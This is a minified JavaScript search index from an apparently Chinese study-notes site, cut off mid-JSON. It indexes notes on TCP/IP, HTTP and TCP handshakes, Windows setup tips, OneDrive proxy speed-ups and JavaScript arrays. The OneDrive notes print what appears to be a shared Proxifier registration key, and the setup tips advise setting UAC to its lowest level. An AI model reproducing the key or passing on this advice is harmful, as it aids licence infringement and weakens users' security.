const g=(o,a)=>{const i=o.toLowerCase(),e=a.toLowerCase(),s=[];let n=0,l=0;const c=(t,p=!1)=>{let r="";l===0?r=t.length>20?`… ${t.slice(-20)}`:t:p?r=t.length+l>100?`${t.slice(0,100-l)}… `:t:r=t.length>20?`${t.slice(0,20)} … ${t.slice(-20)}`:t,r&&s.push(r),l+=r.length,p||(s.push(["strong",a]),l+=a.length,l>=100&&s.push(" …"))};let h=i.indexOf(e,n);if(h===-1)return null;for(;h>=0;){const t=h+e.length;if(c(o.slice(n,h)),n=t,l>100)break;h=i.indexOf(e,n)}return l<100&&c(o.slice(n),!0),s},d=Object.entries,y=Object.keys,f=o=>o.reduce((a,{type:i})=>a+(i==="title"?50:i==="heading"?20:i==="custom"?10:1),0),$=(o,a)=>{var i;const e={};for(const[s,n]of d(a)){const l=((i=a[s.replace(/\/[^\\]*$/,"")])==null?void 0:i.title)||"",c=`${l?`${l} > `:""}${n.title}`,h=g(n.title,o);h&&(e[c]=[...e[c]||[],{type:"title",path:s,display:h}]),n.customFields&&d(n.customFields).forEach(([t,p])=>{p.forEach(r=>{const u=g(r,o);u&&(e[c]=[...e[c]||[],{type:"custom",path:s,index:t,display:u}])})});for(const t of n.contents){const p=g(t.header,o);p&&(e[c]=[...e[c]||[],{type:"heading",path:s+(t.slug?`#${t.slug}`:""),display:p}]);for(const r of t.contents){const u=g(r,o);u&&(e[c]=[...e[c]||[],{type:"content",header:t.header,path:s+(t.slug?`#${t.slug}`:""),display:u}])}}}return y(e).sort((s,n)=>f(e[s])-f(e[n])).map(s=>({title:s,contents:e[s]}))},m=JSON.parse("{\"/\":{\"/computer-network/\":{\"title\":\"计算机网络\",\"contents\":[]},\"/computer-usage-skills/\":{\"title\":\"电脑使用技巧\",\"contents\":[]},\"/data-structures-and-algorithms/\":{\"title\":\"数据结构与算法\",\"contents\":[]},\"/front-end/\":{\"title\":\"前端\",\"contents\":[]},\"/software-tool/\":{\"title\":\"软件工具\",\"contents\":[]},\"/computer-network/xiaolin-coding-network/01-%E5%B0%8F%E6%9E%97coding%E8%AE%A1%E7%BD%91-%E5%9F%BA%E7%A1%80%E7%AF%87.html\":{\"title\":\"小林coding计网-基础篇\",\"contents\":[{\"header\":\"1. TCP/IP网络模型\",\"slug\":\"_1-tcp-ip网络模型\",\"contents\":[\"以下并非严格意义的TCP/IP模型，网络接口被分成两层：\",\"层级\",\"功能\",\"主要协议\",\"应用层\",\"专注于为用户提供应用功能，不关心数据如何传输（在用户态工作，往下是内核态）\",\"HTTP、FTP、 DNS、(SMTP -> IMAP)、Telnet、SSH、NFS、DHCP\",\"传输层\",\"负责向两台终端设备进程之间的通信提供通用的数据传输服务\",\"TCP、UDP\",\"网络层\",\"实际的传输功能，为分组交换网上的不同主机提供通信服务；选择合适的路由\",\"IP、ICMP、IGMP、NAT（路由的网络地址转换协议）\",\"数据链路层（网络接口）\",\"数据链路层的作用是将网络层交下来的 IP 数据报封装成帧，在两个相邻节点间的链路上传送帧\",\"ARP、RARP\",\"物理层（网络接口）\",\"实现相邻计算机节点之间比特流的透明传送，尽可能屏蔽掉具体传输介质和物理设备的差异\",\"应用层协议：\",\"基于TCP的应用层协议\",\"基于UDP的应用层协议\",\"HTTP、FTP、SMTP、TELNET、SSH\",\"DNS、SFTP（简单）、SNMP（简单）\",\"为什么要分层？\",\"各层之间相互独立\",\"提高整体灵活性\",\"大问题化小\",\"传输单位：网络接口层–>帧（frame），IP 层–>包（packet），TCP 层–>段（segment），HTTP–>报文（message）。但这些没有本质区别，可以统称为数据包\",\"小林coding计网-基础篇01.png\"]},{\"header\":\"2. 键入网址到网页显示，期间发生了什么？\",\"slug\":\"_2-键入网址到网页显示-期间发生了什么\",\"contents\":[\"解析URL：首先浏览器要解析URL，URL包括协议 + web服务器 + 目录名和文件名，继而生成发送给web服务器的、对该资源的请求信息\",\"DNS解析：查询服务器域名对应的 IP 地址。DNS服务器保存了 Web 服务器域名与 IP 的对应关系。客户端发送DNS请求给本地DNS服务器，查询对应的IP地址后返回客户端。PS：需要查询时，浏览器、操作系统、hosts文件依次看有没有缓存，不一定每次都要解析IP\",\"TCP连接：HTTP报文是基于TCP传输的，涉及到三次握手。组装好TCP报文后交给网络层处理\",\"发送HTTP请求：\",\"加入IP头部，生成IP报文\",\"加入MAC头部（发送方MAC地址在网卡里，接收方的MAC地址靠ARP协议在以太网广播寻找，当然也是有缓存的）\",\"再经过网卡、交换机、路由器，抵达服务器\",\"服务器处理请求并返回HTTP报文：服务器依次检查MAC头部、IP头、TCP头检查序列号和端口号，HTTP进程收到后把这个网页封装在HTTP响应报文里并返回（相同步骤）\",\"浏览器解析渲染页面：浏览器是一个边解析边渲染的过程\",\"连接结束\"]}]},\"/computer-network/xiaolin-coding-network/02-%E5%B0%8F%E6%9E%97coding%E8%AE%A1%E7%BD%91-HTTP%E7%AF%87.html\":{\"title\":\"小林coding计网-HTTP篇\",\"contents\":[{\"header\":\"1. 常见面试题\",\"slug\":\"_1-常见面试题\",\"contents\":[]},{\"header\":\"1.1 HTTP是什么\",\"slug\":\"_1-1-http是什么\",\"contents\":[\"HTTP 是超文本传输协议\",\"HTTP 是一个在计算机世界里专门在「两点」之间「传输」文字、图片、音频、视频等「超文本」数据的「约定和规范」\"]},{\"header\":\"1.2 HTTP常见状态码\",\"slug\":\"_1-2-http常见状态码\",\"contents\":[\"1xx：提示信息，协议处理的一种中间状态，表示接收的请求正在处理\",\"2xx：成功，服务器正常收到客户端的请求，并处理完毕 \",\"200 OK 是最常见的成功状态码，表示一切正常。如果是非 HEAD 请求，服务器返回的响应头都会有 body 数据\",\"204 No Content与 200 OK 基本相同，但响应头没有 body 数据\",\"206 Partial Content 应用于 HTTP 分块下载或断点续传，表示响应返回的 body 数据并不是资源的全部，而是其中的一部分\",\"3xx：重定向，表示客户端请求的资源发送了变动，需要客户端用新的 URL 重新发送请求获取资源 \",\"301 Moved Permanently永久重定向，说明请求的资源已经不存在了，需改用新的 URL 再次访问\",\"302 Found临时重定向，说明请求的资源还在，但暂时需要用另一个 URL 来访问\",\"301 和 302 都会在响应头里使用字段 Location，指明后续要跳转的 URL，浏览器会自动重定向新的 URL\",\"304 Not Modified不具有跳转的含义，表示资源未修改，重定向已存在的缓冲文件，也称缓存重定向，也就是告诉客户端可以继续使用缓存资源，用于缓存控制\",\"4xx：客户端错误，表示客户端发送的报文有误，服务器无法处理，也就是错误码的含义 \",\"400 Bad Request表示客户端请求的报文有错误，但只是个笼统的错误\",\"403 Forbidden表示服务器禁止访问资源，并不是客户端的请求出错\",\"404 Not Found表示请求的资源在服务器上不存在或未找到，所以无法提供给客户端\",\"5xx：服务器错误，表示客户端请求报文正确，但是服务器处理时内部发生了错误 \",\"500 Internal Server Error与 400 类似，是个笼统通用的错误码，服务器发生了什么错误，我们并不知道\",\"501 Not Implemented表示客户端请求的功能还不支持，类似“即将开业，敬请期待”的意思\",\"502 Bad Gateway通常是服务器作为网关或代理时返回的错误码，表示服务器自身工作正常，访问后端服务器发生了错误\",\"503 Service Unavailable表示服务器当前很忙，暂时无法响应服务器，类似“网络服务正忙，请稍后重试”的意思\"]},{\"header\":\"1.3 HTTP常见字段\",\"slug\":\"_1-3-http常见字段\",\"contents\":[\"Host 客户端发送请求时，用来指定服务器的域名\",\"Content-Length服务器在返回数据时，会有 Content-Length 字段，表明本次回应的数据长度\",\"Connection 最常用于客户端要求服务器使用 TCP 持久连接，以便其他请求复用。HTTP/1.1 版本的默认连接都是持久连接，但为了兼容老版本的 HTTP，需要指定 Connection 首部字段的值为 Keep-Alive\",\"Content-Type服务器回应时，告诉客户端，本次数据是什么格式。客户端请求的时候，可以使用 Accept字段声明自己可以接受哪些数据格式\",\"Content-Encoding表示服务器返回的数据使用了什么压缩格式。客户端在请求时，用 Accept-Encoding字段说明自己可以接受哪些压缩方法\",\"ETag一种将资源以字符串形式做唯一性标识的方式，服务器为每份资源分配对应的ETag值；资源更新时候，ETag值也更新。例如：Google中英文网页的URI虽然相同但对应的ETag不同\"]},{\"header\":\"1.4 GET和POST区别\",\"slug\":\"_1-4-get和post区别\",\"contents\":[\"安全：是指请求方法不会「破坏」服务器上的资源 幂等：多次执行相同的操作，结果都是「相同」的\",\"方法\",\"GET\",\"POST\",\"语义\",\"请求获取指定的资源（只读）\",\"对指定的资源做出处理（新增或提交数据）\",\"安全性\",\"安全、幂等\",\"不安全、不幂等\",\"缓存\",\"可被缓存\",\"一般不会缓存\",\"请求数据位置\",\"一般写在URL中\",\"一般写在报文 body 中\",\"如果不照RFC规范定义的语义来实现的话， 上述都不一定\",\"它们是 HTTP 请求协议的请求方法，而 HTTP 又是基于TCP/IP的关于数据如何在万维网中如何通信的协议，所以 GET/POST 实际上都是 TCP 链接\"]},{\"header\":\"1.5 强制缓存和协商缓存\",\"slug\":\"_1-5-强制缓存和协商缓存\",\"contents\":[\"缓存技术\",\"强制缓存\",\"协商缓存\",\"特点\",\"浏览器判断没过期，则使用缓存（浏览器主动）\",\"状态码304，告知客户端是否可以使用缓存（与服务端协商）\",\"字段\",\"Cache-control:相对时间（优先级高） Expires：绝对时间\",\"请求If-Modified-Since和响应Last-Modified：如果在这个时间后更新了才接受 & 响应资源最后修改时间请求If-None-Match和响应ETag：和ETag不一致的时候才接受（ETag优先级高）\",\"结果\",\"如果最后修改时间较新，则返回最新资源 200 否则返回304\",\"如果资源变化了返回200，否则返回304\"]},{\"header\":\"1.6 HTTP1.1\",\"slug\":\"_1-6-http1-1\",\"contents\":[\"优点：\",\"简单\",\"灵活易扩展（例如HTTPS和HTTP/3对TCP层的修改）\",\"应用广泛，跨平台\",\"缺点：\",\"无状态——Cookie解决\",\"不安全 \",\"明文传输 - 被窃听\",\"不验证通信方身份 - 被冒充和伪装\",\"不校验报文完整性 - 被篡改\",\"和HTTP1.0相比的优势：\",\"长连接——减少重复操作的开销\",\"管道网络传输——不等回应即可发送第二个请求，减少响应时间\",\"队头阻塞\"]},{\"header\":\"1.7 HTTPS\",\"slug\":\"_1-7-https\",\"contents\":[\"HTTP的通信接口部分用SSL/TLS协议代替 == HTTPS（即HTTP + 加密 + 认证 + 完整性保护）\",\"协议\",\"HTTP\",\"HTTPS\",\"安全性\",\"明文传输\",\"TCP 和 HTTP 之间加入了 SSL/TLS 安全协议，加密传输报文\",\"连接\",\"三次握手\",\"三次握手+SSL/TLS握手\",\"端口号\",\"80\",\"443\",\"另外HTTPS需要向CA申请数字证书来确保服务器的身份\",\"如何解决HTTP的安全问题：\",\"明文传输产生的窃听问题——信息加密 （混合加密）\",\"不验证身份产生的冒充问题——校验机制 （证书）\",\"不校验完整性产生的篡改问题——身份证书 （摘要算法）\",\"常见非对称加密算法：RSA、DSA、ECC、DH\",\"常见对称加密算法：DES、3DES、AES、RC（记：RC或者ES结尾的是对称）\"]},{\"header\":\"1.8 HTTP的演变\",\"slug\":\"_1-8-http的演变\",\"contents\":[\"协议\",\"HTTP/1.1\",\"HTTP/2\",\"HTTP/3(QUIC的特点)\",\"改进\",\"1.长连接2.管道运输：一次发送多个请求 3.废弃了两种请求方法LINK和UNLINK，新增了CONNECT、OPTIONS和TRACE4.新增了大量状态码\",\"1.头部压缩2.二进制格式 3.数据流：可以乱序发送，后stream ID组成HTTP信息 4.多路复用，串行变成并发5.服务器推送\",\"TCP->UDP+ QUIC1.无队头阻塞2.更快的连接建立（QUIC包含TLS，只需1个RTT）3.连接迁移\",\"不足\",\"1.头部冗长，未经压缩，浪费带宽，造成延迟2.没有请求优先级，所以队头阻塞(HTTP层) 3.服务器只能被动接收客户端的请求\",\"TCP层队头阻塞 TCP和TLS握手时延\",\"普及慢，很多网络设备不识别QUIC\",\"小林coeding计网-HTTP篇01.png\"]},{\"header\":\"2. HTTP1.1如何优化\",\"slug\":\"_2-http1-1如何优化\",\"contents\":[\"三个角度\",\"具体优化方法\",\"避免发送HTTP请求\",\"缓存 客户端第一次请求及数据保存在本地磁盘，形成<key,value> 过期？在请求的ETag带上第一次请求中响应头部的摘要，服务器收到后会与本地资源的摘要作比较，如果相同则返回不含包体的304 Not Modified\",\"减少请求次数\",\"1.减少重定向请求次数：利用中间的代理服务器知晓规则2.合并请求：合并资源，如CSS、webpack3.延迟发送请求：按需获取，滑动页面的时候再获取资源\",\"减少服务器响应数据大小\",\"无损压缩：gzip。请求Accepy-Encoding，响应Content-Encoding（文本、程序代码)有损压缩：舍弃一些数据（质量）。请求Accept中的q质量因子（音视频、图片）\"]},{\"header\":\"3. HTTPS如何优化\",\"slug\":\"_3-https如何优化\",\"contents\":[\"硬件优化、软件优化：HTTPS 协议是计算密集型，而不是 I/O 密集型，所以不能把钱花在网卡、硬盘等地方，应该花在 CPU 上\",\"协议优化 \",\"用ECDHE替换RSA，往返1RTT\",\"TLS 1.2->TLS 1.3，往返1RTT；在Hello时就发送椭圆曲线，且废除RSA和DH\",\"证书优化 \",\"证书选择：椭圆曲线证书比RSA密钥长度短\",\"证书验证优化：OCSP(Online Certificate Status Protocal)、OCSP Stapling\",\"密钥缓存（无前向安全，且易被重放攻击） \",\"Session ID：双方缓存密钥，Session ID和密钥相当于key-value。但是也有缺点，首先是每一个客户端都要保存密钥，其次是现在网站一般多服务器，不一定命中上次的服务器\",\"Session Ticket：客户端负责缓存\",\"Pre-shared Key：TLS 1.3重连只需要0 RTT。重连时Ticket和HTTP一起发给服务端\",\"解决重放攻击，应给密钥设定过期时间\"]},{\"header\":\"4. HTTP2提高传输效率、吞吐能力\",\"slug\":\"_4-http2提高传输效率、吞吐能力\",\"contents\":[\"兼容HTTP1.1\",\"没有在URL改变协议名字，只在应用层做了改变，还是基于TCP传输，但是把HTTP分解成了语义和语法，语义没变，还是请求方法、状态码和头字段等，语法有很多改变\",\"头部压缩（解决头部冗长问题）\",\"HPACK取代gzip \",\"静态表：首先两端维护一个字典，用索引号index代替字段名（GET，200，https等），共61种高频字符串\",\"动态表：发送新首部时在静态表里添加索引号\",\"Huffman编码：关于首部字段的内容用哈夫曼编码代替，基于二进制编码，不需要\\\\r\\\\n，改用表示字符串长度的Value Length\",\"二进制帧\",\"二进制+位运算\",\"并发传输（解决队头阻塞问题）\",\"多个Stream复用一条TCP连接，达到并发效果；每个帧头携带Stream ID，同一Stream内部的帧严格有序，方便接收后组装；还可以设置优先级，比方说先传递HTML再传递图片\",\"包含关系：TCP连接 > Stream > Message >Frame\",\"服务器主动推送（解决不支持服务器推送问题）\",\"但是HTTP2是基于TCP传输数据的，TCP是字节流协议，必须保证字节数据是完整连续的，内核才会将缓冲区的数据给HTTP应用，这方面存在阻塞，因此改用UDP，即HTTP3\"]},{\"header\":\"5. HTTP3\",\"slug\":\"_5-http3\",\"contents\":[\"之前存在的问题：\",\"队头阻塞：TCP丢包时，整个TCP都要等待重传\",\"握手延迟：发起HTTP请求时，需要经过TCP+TLS总计3RTT时延\",\"网络迁移需要重新连接：4G切WiFi时要重新握手，因为IP地址和端口变动了\",\"QUIC协议特点：\",\"无队头阻塞，Stream之间没有依赖\",\"更快建立连接：QUIC包含TLS，只需要1RTT即可握手\",\"连接迁移：通过连接ID标记两个端点，而不是IP地址和端口\",\"其他：HPACK升级->QPACK，静态表91项\"]}]},\"/computer-network/xiaolin-coding-network/03-%E5%B0%8F%E6%9E%97coding%E8%AE%A1%E7%BD%91-TCP%E7%AF%87.html\":{\"title\":\"小林coding计网-TCP篇\",\"contents\":[{\"header\":\"1. 三次握手、四次挥手\",\"slug\":\"_1-三次握手、四次挥手\",\"contents\":[\"小林coding计网-TCP篇01.png\",\"TCP\",\"特点\",\"为什么需要TCP？\",\"IP层不可靠，不保证网络包的交付和数据完整性TCP确保无损坏、无间隔、非冗余、按序\",\"连接的基本共识\",\"Socket：IP号 + 端口号序列号：解决乱序问题窗口大小：流量控制\",\"如何唯一确定？\",\"四元组地址字段在IP头，端口字段在TCP头\",\"TCP最大连接数？\",\"理论上max = 客户端IP数 * 客户端端口数，实际受FD和内存的限制\",\"TCP\",\"UDP\",\"连接和方式\",\"面向连接、可靠、字节流\",\"无连接、不可靠、数据报\",\"连接对象\",\"一对一（单播）\",\"一对一、一对多、多对一、 多对多（单播、多播、广播）\",\"拥塞控制\",\"有拥塞控制\",\"无\",\"首部开销\",\"至少20字节\",\"8字节\",\"分片机制\",\"如果HTTP消息比MSS长，就要在传输层分片\",\"UDP数据如果大于MTU，在IP层分片\",\"使用场景\",\"实时应用，包括： 音视频、多媒体包总量少的通信，如DNS、SNMP等\",\"FTP文件传输、HTTP/S\",\"小林coding计网-TCP篇02.png\",\"为什么是三次握手：\",\"避免历史连接：如果因为宕机重发，最好在「被动发起方」建立连接前阻止历史连接，就不会资源浪费，而这样就需要三次握手\",\"同步双方初始序列号：序列号作用：不重复、不丢弃、按序传输\",\"避免资源浪费：服务端每收到一个SYN只能建立一个连接（因为不知道客户端是否收到自己的ACK），可能有冗余连接\",\"初始化序列号不一样？\",\"为了防止历史报文被下一个相同四元组的连接接收。有时前一条数据因故阻塞，恰好服务端断电重启了，再重新建立连接，之前阻塞的消息再到达后会出bug。总而言之，为了防止上一次连接的数据被下一次连接接收\",\"TCP为什么需要MSS？\",\"先看定义：\",\"MTU：一个网络包的最大长度，以太网中一般为 1500 字节\",\"MSS：除去 IP 和 TCP 头部之后，一个网络包所能容纳的 TCP 数据的最大长度\",\"IP没有超时重传机制，如果有一个IP分片丢失，那么整个IP报文分片都得重传；所以为了传输效能，TCP建立连接时协商MSS值，由此分片后IP包也不回大于MTU，此后如果一个TCP分片丢失了，重发时也只是以MSS为单位\",\"第一次握手丢失了，发生什么？\",\"客户端重传第一次握手SYN报文。第一次超时重传是在1秒后，每次重传时间是上一次的2倍，第5次重传（重传次数由内核参数决定）后，会等待32秒，如果还没回应就断开连接\",\"第二次握手丢失了，发生什么？\",\"两边都会重传：客户端重传第一次握手SYN报文，最大重传次数由tcp_syn_retries内核参数决定。服务端重传第二次握手SYN-ACK报文，最大重传次数由tcp_synack_retries内核参数决定\",\"第三次握手丢失了，发生什么？\",\"服务端重传第二次握手SYN-ACK报文\",\"SYN攻击：攻击者伪造不同IP发送SYN报文，服务端发出去的ACK+SYN 无应答，占满半连接队列\",\"SYN攻击避免方式：\",\"修改Linux内核参数，控制队列大小和队满处理方式\",\"tcp_syncokies方法。半连接队列满了后，新收到的SYN包计算出cookie值，返回给客户端；再收到客户端的应答报文时，检查合法性后直接放入全连接队列\",\"小林coding计网-TCP篇03.png\",\"为什么需要四次？\",\"假设客户端主动关闭连接，客户端发送FIN时，仅仅表示客户端不发数据了，但还能接收数据。服务端可能还有数据处理发送，待不再发送时，才回FIN给客户端\",\"第一次挥手丢失了，发生什么？ 重传第一次挥手FIN报文，最大次数由tcp_orphan_retries决定；超过最大次数后再等待两倍时间就会断开\",\"第二次挥手丢失了，发生什么？ 重传第一次挥手FIN报文（ACK报文是不会重传的）。对于调用close关闭的连接，60秒内没有收到FIN报文，主动关闭方就会关闭连接\",\"第三次挥手丢失了，发生什么？ 和第一次挥手丢失后有些类似，重传并等待第四次挥手，超过参数后断开连接\",\"第四次挥手丢失了，发生什么？ 重传第三次挥手FIN报文。客户端接收到 FIN 后发送 ACK ，进入TIME_WAIT状态并等待2MSL 的时间。如果在 2MSL 时间内，因为客户端的 ACK 没有传输到服务端，客户端又接收到了服务端重发的 FIN 报文，那么 2MSL 时间将重新计时\",\"为什么需要TIME_WAIT？\",\"2MSL的时间足以让原来连接的数据包都自然消失，防止历史连接数据被相同四元组错误连接接收\",\"保证正确关闭。如果没有2MSL，客户端直接CLOSE，如果服务端再向已关闭的客户端发送FIN报文，客户端会回 RST 报文，不属于正常关闭了\",\"客户端TIME_WAIT过多\",\"服务端TIME_WAIT过多\",\"危害\",\"占用端口资源，很难和目的IP + Port 一样的服务器建立连接，但只要是不同的服务器还是可以重复使用的\",\"因为服务器只监听一个端口，不会导致端口资源受限；但是会占用系统资源，比如fd、内存、CPU等\",\"TCP\",\"客户端出现故障\",\"服务端出现故障\",\"建立连接后\",\"socket设置SO_KEEPALIVE启动保活机制，定时检测客户端故障造成的死亡连接\",\"服务端会发送FIN和客户端进行挥手\"]}]},\"/computer-network/xiaolin-coding-network/\":{\"title\":\"小林coding计网\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文借鉴小林coding的图解计算机网络以及该文章https://blog.csdn.net/weixin_53833977/article/details/124421812\"]}]},\"/computer-usage-skills/optimization/01-%E6%96%B0%E6%9C%BA%E5%BC%80%E8%8D%92%E6%8C%87%E5%8D%97.html\":{\"title\":\"新机开荒指南\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"一个刚装完系统的电脑需要做什么？\",\"安装显卡驱动\",\"关掉系统底部任务栏无用的内容\",\"卸载掉不需要的系统应用\",\"进入设置隐私, 墨迹书写和键入个性化、诊断与反馈、日历联系人、后台应用，全部关掉\",\"开始菜单右键，个性化，选择哪些文件夹显示在“开始”菜单上\",\"进入文件资源管理器，点击上方的查看->选项，在常规中将“打开文件资源管理器时打开”选项改为“此电脑”，在此处可以设置隐私\",\"将系统文件夹中的七个文件夹路径改为 C 盘外的盘（注意命名时最好使用英文）\",\"打开控制面板，打开系统和安全->更改用户账户控制设置->拉到最低\",\"进入设置->系统->存储->更改新内容的保存位置，改成除 C 盘外的其他盘\",\"进入系统服务，禁用无用的服务 \",\"打印假脱机程序 Print Spooler如果您的计算机不使用打印机，可以禁用打印后台处理服务。未使用的可以先禁用，然后在使用时打开\",\"下载地图管理器 Downloaded Maps Manager可以直接禁用下载的地图管理器\",\"视窗防御防火墙 Windows Defender Firewall防火墙，视窗杀毒软件，如果你的电脑安装了第三方杀毒工具，你可以关闭它，如果没有，你最好打开它\",\"远程桌面服务/配置 Remote Desktop Services /Configuration这三项服务与远程桌面相关。如果您在使用遥控功能时通常使用 QQ 或电视，您可以禁用此服务\",\"互联用户体验和遥测 Connected User Experiences and Telemetry该服务是操作系统的微软外围辅助服务。主要用于收集数据，但也有责任收集错误和崩溃信息\",\"诊断执行服务/策略/服务主机系统主机 Diagnostic Execution Service/Policy/Service Host/System Host这四种服务是系统诊断服务，用于支持和执行系统诊断。这些服务会有高 CPU 使用率的问题，可以禁用\",\"传真 Fax目前很少使用的传真服务通常是默认禁用的\",\"智能卡 Smart Card普通用户不使用智能卡服务\",\"触摸键盘和手写面板服务 Touch Keyboard and Handwriting Panel Service触摸键盘和手写面板，非触摸屏用户可以直接禁用笔和墨水功能\",\"净 logo Netlogon此服务使用域控制器来验证您的用户帐户和其他服务，这些服务通常不被独立于家庭的计算机使用，可以直接禁用\"]}]},\"/computer-usage-skills/optimization/02-%E5%88%A0%E9%99%A4%E6%AD%A4%E7%94%B5%E8%84%91%E4%B8%AD%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F.html\":{\"title\":\"删除此电脑中的快捷方式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"我们在使用电脑时经常会遇到这种情况，在\\\"此电脑\\\"中出现很多快捷方式，那么怎们删除它们呢？\",\"删除此电脑中的快捷方式.png\",\"直接右键删除\",\"右键删除无效的，使用开源软件 MyComputerManager\",\"还是不行的话，打开注册表，修改注册表，路径为：计算机\\\\HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\MyComputer\\\\NameSpace\\n进入以后删除快捷方式即可\"]}]},\"/computer-usage-skills/optimization/03-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8.html\":{\"title\":\"软件设置开机自启动\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"建议使用任务计划启动\",\"关闭软件的自启动\",\"打开任务计划程序\",\"软件设置开机自启动01.png\",\"选择操作中的创建任务\",\"软件设置开机自启动02.png\",\"输入名称，记得勾上使用最高权限运行\",\"软件设置开机自启动03.png\",\"切换到触发器，新建选择登陆时\",\"软件设置开机自启动04.png\",\"切换到操作，新建启动程序某某某\",\"软件设置开机自启动05.png\",\"设置完成，点击确定即可\"]}]},\"/computer-usage-skills/optimization/04-win11%E4%BF%AE%E6%94%B9%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95.html\":{\"title\":\"Win11修改右键菜单\",\"contents\":[{\"header\":\"1. 还原为Win10右键菜单\",\"slug\":\"_1-还原为win10右键菜单\",\"contents\":[\"win+R输入cmd，打开命令提示符\",\"输入如下命令：\",\"reg add HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\\\InprocServer32 /f /ve \",\"随后重启电脑即可\"]},{\"header\":\"2. 恢复为Win11右键菜单\",\"slug\":\"_2-恢复为win11右键菜单\",\"contents\":[\"在命令提示符中输入如下命令：\",\"reg.exe delete \\\"HKCU\\\\Software\\\\Classes\\\\CLSID\\\\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\\\\InprocServer32\\\" /va /f \",\"随后重启电脑即可\"]}]},\"/computer-usage-skills/optimization/05-OneDrive%E4%B8%8B%E8%BD%BD%E6%8F%90%E9%80%9F.html\":{\"title\":\"OneDrive下载提速\",\"contents\":[{\"header\":\"1. 使用Proxifier设置代理\",\"slug\":\"_1-使用proxifier设置代理\",\"contents\":[\"官网：https://www.proxifier.com/download/\",\"下载完成后安装\",\"注册码：F9ZN9-MYUAM-LSS3K-SBN7B-UT9PF\",\"设置开机自启：Autostart\",\"通过Profile->Proxy Servers，添加 HTTPS 和 Socks5 代理配置\",\"通过Profile->Proxification Rules，配置软件代理规则\",\"我们在这里添加OneDrive，先找到OneDrive的可执行文件的位置。一般应该是在%localappdata%\\\\Microsoft\\\\OneDrive\\\\，如果没有，运行OneDrive，打开任务管理器，在详细信息标签页，找到onedrive.exe，右键打开文件所在位置，点击Add，添加配置。点击Browse输入OneDrive目录，选择onedrive.exe，action选择通过socks5代理即可，然后保存，并把 default 的 action 设置为 direct\"]},{\"header\":\"2. 设置OneDrive多线程下载\",\"slug\":\"_2-设置onedrive多线程下载\",\"contents\":[\"修改这个文件：\\\"%localappdata%\\\\Microsoft\\\\OneDrive\\\\settings\\\\Personal\\\\global.ini\\\"\",\"我们在第一行加入：\",\"numberOfConcurrentUploads=3 \",\"PS：数值项即为线程数，最小值为1，最大值为3，根据实际需要选择即可\"]}]},\"/computer-usage-skills/optimization/\":{\"title\":\"优化设置\",\"contents\":[]},\"/computer-usage-skills/troubleshoot/01-%E6%B8%B8%E6%88%8F%E9%97%AA%E9%80%80%E6%80%8E%E4%B9%88%E5%8A%9E.html\":{\"title\":\"游戏闪退怎么办？\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"检查游戏文件的完整性 \",\"steam 右击游戏属性，本地文件，验证完整性\",\"Quick Fix 检测驱动和系统时间 \",\"检查系统时间是否正确\",\"更新显卡驱动\",\"使用联想 Quick Fix Lenovo Quick Fix：游戏闪退检测工具\",\"3DM 修复 \",\"使用 3DM 离线包修复：3DM游戏运行库合集离线安装包\",\"尝试使用加速器 \",\"推荐使用 steam++（Watt Toolkit）：Watt Toolkit\",\"重启、重装 \",\"重启解决 90%问题\",\"重装解决 99%问题\"]}]},\"/computer-usage-skills/troubleshoot/\":{\"title\":\"疑难解答\",\"contents\":[]},\"/data-structures-and-algorithms/js-data-structures-and-algorithms/01-JS%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95-%E6%95%B0%E7%BB%84.html\":{\"title\":\"数组\",\"contents\":[{\"header\":\"1. 创建和初始化数组\",\"slug\":\"_1-创建和初始化数组\",\"contents\":[\"[]\",\"const arr = [1,2,3] \",\"new Array()\",\"const arr = new Array(1,2,3) \",\"大多数时候我们有“创造指定长度的空数组”这样的需求：\",\"// 长度为7的空数组 const arr = new Array(7) \",\"我们还会有“创建一个长度确定、同时每一个元素的值也都确定的数组“的需求，可以使用fill方法：\",\"// 长度为7，且每个元素都初始化为1的数组 const arr = (new Array(7)).fill(1) \"]},{\"header\":\"2. 数组的访问和遍历\",\"slug\":\"_2-数组的访问和遍历\",\"contents\":[]},{\"header\":\"1. 访问\",\"slug\":\"_1-访问\",\"contents\":[\"访问数组中的元素，我们直接在中括号中指定其索引即可：\",\"// 访问索引下标为0的元素 arr[0] \"]},{\"header\":\"2. 遍历\",\"slug\":\"_2-遍历\",\"contents\":[]},{\"header\":\"1. for循环\",\"slug\":\"_1-for循环\",\"contents\":[\"推荐使用\",\"// 获取数组的长度 const len = arr.length for(let i=0;i<len;i++) { // 输出数组的元素值，输出当前索引 console.log(arr[i], i) } \"]},{\"header\":\"2. forEach方法\",\"slug\":\"_2-foreach方法\",\"contents\":[\"通过取 forEach 方法中传入函数的第一个参数和第二个参数，我们也可以取到数组每个元素的值及其对应索引\",\"arr.forEach((item, index)=> { // 输出数组的元素值，输出当前索引 console.log(item, index) }) \"]},{\"header\":\"3. map方法\",\"slug\":\"_3-map方法\",\"contents\":[\"map 方法在调用形式上与 forEach 无异，区别在于 map 方法会根据你传入的函数逻辑对数组中每个元素进行处理、进而返回一个全新的数组\",\"map 做的事情不仅仅是遍历，而是在遍历的基础上“再加工”\",\"const newArr = arr.map((item, index)=> { // 输出数组的元素值，输出当前索引 console.log(item, index) // 在当前元素值的基础上加1 return item+1 }) // 这段代码就通过 map 来返回了一个全新的数组，数组中每个元素的值都是在其现有元素值的基础上+1后的结果 \"]},{\"header\":\"3. 二维数组\",\"slug\":\"_3-二维数组\",\"contents\":[\"const arr = [ [1,2,3,4,5], [1,2,3,4,5], [1,2,3,4,5], [1,2,3,4,5], [1,2,3,4,5] ] 